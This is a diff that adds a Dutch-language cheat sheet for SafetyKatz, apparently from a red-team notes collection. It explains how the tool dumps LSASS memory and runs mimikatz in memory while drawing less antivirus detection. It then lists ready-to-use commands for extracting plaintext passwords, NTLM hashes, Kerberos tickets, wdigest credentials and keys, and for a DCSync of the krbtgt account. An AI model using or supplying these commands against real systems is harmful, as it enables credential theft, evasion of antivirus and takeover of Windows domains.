@@ -1,0 +1,41 @@
+# SafetyKatz — MiniDump van LSASS + offline mimikatz parsing
+# Draait mimikatz in-memory via MiniDumpWriteDump, minder detectie dan direct mimikatz
+#
+# === Syntax ===
+# SafetyKatz.exe [mimikatz-commando]
+#
+# === Werking ===
+# 1. Maakt een minidump van LSASS proces via MiniDumpWriteDump
+# 2. Laadt mimikatz in-memory (geen exe op disk)
+# 3. Parsed de dump met het opgegeven mimikatz commando
+# 4. Verwijdert de dump na afloop
+#
+# === Voorbeelden ===
+
+# Plaintext wachtwoorden en hashes uit LSASS dump
+SafetyKatz.exe "sekurlsa::logonpasswords"
+
+# Alleen NTLM hashes
+SafetyKatz.exe "sekurlsa::msv"
+
+# Kerberos tickets uit geheugen
+SafetyKatz.exe "sekurlsa::tickets"
+
+# Wdigest credentials
+SafetyKatz.exe "sekurlsa::wdigest"
+
+# Credential keys
+SafetyKatz.exe "sekurlsa::credentialkeys"
+
+# eKeys (encryption keys)
+SafetyKatz.exe "sekurlsa::ekeys"
+
+# DCSync via SafetyKatz (als je de juiste rechten hebt)
+SafetyKatz.exe "lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt"
+
+# Zonder argumenten — standaard logonpasswords
+SafetyKatz.exe
+
+# NOTE: Vereist admin/SYSTEM rechten
+# NOTE: Minder AV detectie dan mimikatz.exe direct draaien
+# NOTE: LSASS dump is tijdelijk en wordt automatisch opgeruimd
